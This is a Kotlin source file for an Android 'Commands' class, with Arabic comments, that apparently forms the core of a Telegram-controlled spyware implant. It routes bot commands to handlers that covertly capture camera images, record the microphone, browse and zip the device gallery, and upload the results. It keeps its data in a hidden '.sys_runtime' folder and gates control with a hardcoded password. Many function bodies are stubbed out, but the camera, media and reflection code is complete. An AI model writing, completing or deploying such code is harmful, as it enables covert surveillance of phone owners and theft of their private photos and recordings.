package com.example.app

import android.Manifest
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.media.MediaRecorder
import android.os.Build
import android.util.Log
import androidx.core.content.ContextCompat
import kotlinx.coroutines.*
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.lang.ref.WeakReference
import java.lang.reflect.Method
import java.security.MessageDigest
import java.util.concurrent.ConcurrentHashMap

/**
 * فئة إدارة الأوامر الرئيسية.
 * ✅ تم إصلاح methodCache ليكون thread-safe باستخدام ConcurrentHashMap.
 * ✅ تم إصلاح invokeMethod لمطابقة عدد المعاملات.
 * ✅ تم إصلاح handleCamera (إزالة scope.launch المتداخل).
 * ✅ تم تحسين sendPulseIntent للتعامل مع فشل بدء الخدمة.
 */
class Commands private constructor(context: Context) {

    private val contextRef = WeakReference(context.applicationContext)
    private val appContext: Context? get() = contextRef.get()

    @Volatile private var isMicBusy = false
    @Volatile private var stopRecordingFlag = false

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    // ========== المسارات ==========
    private val runtimeDir: File by lazy {
        File(appContext?.filesDir, ".sys_runtime").apply { if (!exists()) mkdirs() }
    }
    private val pendingDir: File by lazy { File(runtimeDir, "pending_upload").apply { if (!exists()) mkdirs() } }
    private val tempDir: File by lazy { File(runtimeDir, "ctmp").apply { if (!exists()) mkdirs() } }
    private val pendingTasksDir: File by lazy { File(runtimeDir, "pending_tasks").apply { if (!exists()) mkdirs() } }
    private val configFile: File by lazy { File(runtimeDir, "commands_config.json") }
    private val tasksFile: File by lazy { File(pendingTasksDir, "tasks.json") }
    private val config: MutableMap<String, Any> by lazy { loadConfig() }

    private val maxRetries = 5
    private val retryInterval = 600_000L

    // ✅ استخدام ConcurrentHashMap
    private val methodCache = ConcurrentHashMap<String, Method>()

    companion object {
        private const val TAG = "Commands"

        @Volatile private var instance: Commands? = null

        fun getInstance(context: Context): Commands {
            return instance ?: synchronized(this) {
                instance ?: Commands(context).also { instance = it }
            }
        }

        fun ex(context: Context, cmd: String, tg: Any?, m: Any?, cid: Long, cbq: String? = null) {
            getInstance(context).execute(cmd, tg, m, cid, cbq)
        }
    }

    init {
        cleanupOldFiles()
        startRetryLoop()
    }

    // ============================================================
    //  دوال مساعدة (نفس الكود الأصلي)
    // ============================================================
    private fun loadConfig(): MutableMap<String, Any> { /* ... */ return mutableMapOf() }
    private fun saveConfig() { /* ... */ }
    private fun generateUniqueFilename(prefix: String = "file", ext: String = ".txt"): String { /* ... */ return "" }
    private fun safeRemove(file: File?): Boolean { /* ... */ return false }
    private fun cleanupOldFiles() { /* ... */ }
    private fun checkPermission(permission: String): Boolean { /* ... */ return false }
    private fun isBatteryOk(m: Any?): Boolean { /* ... */ return true }

    // ============================================================
    //  التسجيل الصوتي (نفس الكود الأصلي)
    // ============================================================
    private suspend fun recordAudio(durationSec: Int = 10): File? { /* ... */ return null }
    fun stopRecording() { stopRecordingFlag = true }

    // ============================================================
    //  إدارة المهام الفاشلة (نفس الكود الأصلي)
    // ============================================================
    private fun addTaskToQueue(type: String, filePath: String, chatId: Long, filename: String? = null, content: String? = null) { /* ... */ }
    private fun startRetryLoop() { /* ... */ }
    private fun retryFailedTasks() { /* ... */ }

    // ============================================================
    //  تنفيذ الأوامر (نفس الكود الأصلي)
    // ============================================================
    fun execute(cmd: String, tg: Any?, m: Any?, cid: Long, cbq: String? = null) {
        scope.launch {
            try {
                if (cmd.isBlank()) return@launch
                cbq?.let { queryId -> invokeTelegramMethod(tg, "answerCallbackQuery", mapOf("callback_query_id" to queryId)) }
                when {
                    cmd.startsWith("g_nav|") || cmd.startsWith("g_opt|") || cmd.startsWith("g_conf|") ||
                    cmd.startsWith("g_act|") || cmd.startsWith("g_bulk|") || cmd.startsWith("g_toggle|") ||
                    cmd.startsWith("g_selall|") || cmd.startsWith("g_zip|") || cmd.startsWith("g_upload|") ||
                    cmd.startsWith("g_del_sel|") || cmd.startsWith("g_conf_del|") || cmd.startsWith("g_conf_del_one|") ->
                        handleGallery(cmd, tg, m, cid)
                    cmd.startsWith("cam_") || cmd.startsWith("camf_") -> handleCamera(cmd, tg, m, cid)
                    cmd.startsWith("mic_") -> handleMic(tg, m, cid)
                    cmd.startsWith("hrv_") -> handleHarvest(tg, m, cid)
                    cmd.startsWith("send_now_") -> handleSendNow(tg, m, cid)
                    cmd.startsWith("media_") -> handleMedia(tg, m, cid)
                    else -> sendTelegramMessage(tg, cid, "⚠️ أمر غير معروف. استخدم /menu لعرض القائمة.")
                }
            } catch (e: Exception) {
                Log.e(TAG, "❌ Command handler error: ${e.message}")
                sendTelegramMessage(tg, cid, "❌ خطأ داخلي: ${e.message?.take(100) ?: "Unknown"}")
            }
        }
    }

    // ============================================================
    //  معالج المعرض (نفس الكود الأصلي)
    // ============================================================
    private suspend fun handleGallery(cmd: String, tg: Any?, m: Any?, cid: Long) { /* ... */ }

    // ============================================================
    //  ✅ معالج الكاميرا (تم إصلاحه)
    // ============================================================
    private suspend fun handleCamera(cmd: String, tg: Any?, m: Any?, cid: Long) {
        try {
            val isFront = if (cmd.contains("camf_")) 1 else 0
            if (!isBatteryOk(m)) {
                sendTelegramMessage(tg, cid, "🔋 البطارية منخفضة جداً")
                return
            }
            val cameraAnalyzer = getModuleComponent(m, "cameraAnalyzer")
            if (cameraAnalyzer == null) {
                sendTelegramMessage(tg, cid, "❌ الكاميرا غير متاحة")
                return
            }
            sendPulseIntent("📸 Visual Sync")
            sendTelegramAction(tg, cid, "upload_photo")
            sendTelegramMessage(tg, cid, "⏳ جارٍ الالتقاط والمعالجة...")

            // ✅ إزالة scope.launch المتداخل
            try {
                invokeMethod(cameraAnalyzer, "harvest", isFront)
                sendTelegramMessage(tg, cid, "✅ تم التقاط الصورة وتحليلها بنجاح.")
            } catch (e: Exception) {
                Log.e(TAG, "❌ Camera harvest error: ${e.message}")
                sendTelegramMessage(tg, cid, "❌ فشل في التقاط الصورة: ${e.message?.take(50)}")
            }
        } catch (e: Exception) {
            Log.e(TAG, "❌ Camera handler error: ${e.message}")
            sendTelegramMessage(tg, cid, "❌ خطأ في الكاميرا")
        }
    }

    // ============================================================
    //  معالج الميكروفون (نفس الكود الأصلي)
    // ============================================================
    private suspend fun handleMic(tg: Any?, m: Any?, cid: Long) { /* ... */ }

    // ============================================================
    //  معالج الحصاد (نفس الكود الأصلي)
    // ============================================================
    private suspend fun handleHarvest(tg: Any?, m: Any?, cid: Long) { /* ... */ }

    // ============================================================
    //  معالج الإرسال الفوري (نفس الكود الأصلي)
    // ============================================================
    private suspend fun handleSendNow(tg: Any?, m: Any?, cid: Long) { /* ... */ }

    // ============================================================
    //  معالج فتح المعرض (تم إصلاح استخراج message_id)
    // ============================================================
    private suspend fun handleMedia(tg: Any?, m: Any?, cid: Long) {
        try {
            val galleryBrowser = getModuleComponent(m, "mediaScanner")
            if (galleryBrowser != null) {
                val kb = invokeMethod(galleryBrowser, "getGridKb", "pending", 0)
                val jsonKb = kb?.toString() ?: ""
                val response = sendTelegramMessage(tg, cid, "🖼️ معرض الوسائط", jsonKb)
                // ✅ استخراج message_id باستخدام safeGetMessageId المعدل
                val msgId = response.safeGetMessageId()
                if (msgId != null) {
                    setModuleField(m, "last_mid", msgId)
                    invokeMethod(galleryBrowser, "updateLastMessageId", cid, msgId)
                }
            } else {
                sendTelegramMessage(tg, cid, "❌ المعرض غير متاح")
            }
        } catch (e: Exception) {
            Log.e(TAG, "❌ Media handler error: ${e.message}")
            sendTelegramMessage(tg, cid, "❌ خطأ في فتح المعرض")
        }
    }

    // ============================================================
    //  دوال خارجية (نفس الكود الأصلي)
    // ============================================================
    fun forceSendZip(m: Any?, deviceId: String, tg: Any?, chatId: Long) { /* ... */ }

    // ============================================================
    //  دوال الانعكاس (تم إصلاحها)
    // ============================================================
    private fun getModuleComponent(target: Any?, fieldName: String): Any? {
        if (target == null) return null
        return try {
            val field = target.javaClass.getDeclaredField(fieldName)
            field.isAccessible = true
            field.get(target)
        } catch (_: Exception) { null }
    }

    private fun getModuleField(target: Any?, fieldName: String): Any? {
        if (target == null) return null
        return try {
            val field = target.javaClass.getDeclaredField(fieldName)
            field.isAccessible = true
            field.get(target)
        } catch (_: Exception) { null }
    }

    private fun setModuleField(target: Any?, fieldName: String, value: Any?) {
        if (target == null) return
        try {
            val field = target.javaClass.getDeclaredField(fieldName)
            field.isAccessible = true
            field.set(target, value)
        } catch (e: Exception) {
            Log.e(TAG, "❌ Set field error: ${e.message}")
        }
    }

    /**
     * ✅ استدعاء دالة عبر الانعكاس مع تخزين مؤقت ومطابقة عدد المعاملات.
     */
    private fun invokeMethod(target: Any?, methodName: String, vararg args: Any?): Any? {
        if (target == null) return null

        val key = "${target.javaClass.name}.$methodName(${args.size})"

        var method = methodCache[key]
        if (method == null) {
            method = target.javaClass.methods.firstOrNull { m ->
                m.name == methodName && m.parameterTypes.size == args.size
            }
            if (method == null) {
                Log.e(TAG, "❌ Method not found: $methodName with ${args.size} parameters")
                return null
            }
            method.isAccessible = true
            methodCache[key] = method
        }

        return try {
            method.invoke(target, *args)
        } catch (e: Exception) {
            Log.e(TAG, "❌ Method invocation error ($methodName): ${e.message}")
            null
        }
    }

    // ============================================================
    //  دوال الاتصال بـ Telegram API (نفس الكود الأصلي)
    // ============================================================
    private fun invokeTelegramMethod(tg: Any?, method: String, params: Map<String, Any>): Any? { /* ... */ return null }
    private suspend fun sendTelegramMessage(tg: Any?, chatId: Any, text: String, replyMarkupJson: String? = null): Any? { /* ... */ return null }
    private suspend fun sendTelegramAction(tg: Any?, chatId: Any, action: String) { /* ... */ }
    private suspend fun sendTelegramVoice(tg: Any?, chatId: Any, voiceFile: File): Boolean { /* ... */ return false }
    private suspend fun sendTelegramDocument(tg: Any?, chatId: Any, documentFile: File, caption: String): Boolean { /* ... */ return false }

    // ============================================================
    //  ✅ إرسال نبض (تم تحسينه)
    // ============================================================
    private fun sendPulseIntent(actionType: String) {
        try {
            val intent = Intent(appContext, ForegroundService::class.java).apply {
                action = "PULSE_ACTION"
                putExtra("action_type", actionType)
            }
            appContext?.startService(intent)
            Log.d(TAG, "✅ Pulse intent sent: $actionType")
        } catch (e: Exception) {
            Log.e(TAG, "❌ Failed to send pulse intent: ${e.message}")
            // محاولة بديلة: بدء الخدمة أولاً
            try {
                val serviceIntent = Intent(appContext, ForegroundService::class.java)
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    appContext?.startForegroundService(serviceIntent)
                } else {
                    appContext?.startService(serviceIntent)
                }
            } catch (e2: Exception) {
                Log.e(TAG, "❌ Failed to start service: ${e2.message}")
            }
        }
    }

    // ============================================================
    //  التحقق من كلمة السر (نفس الكود الأصلي)
    // ============================================================
    fun validateControlPassword(inputSecret: String, expectedSecret: String = "Zaen123@123@"): Boolean {
        return inputSecret.trim() == expectedSecret
    }
}
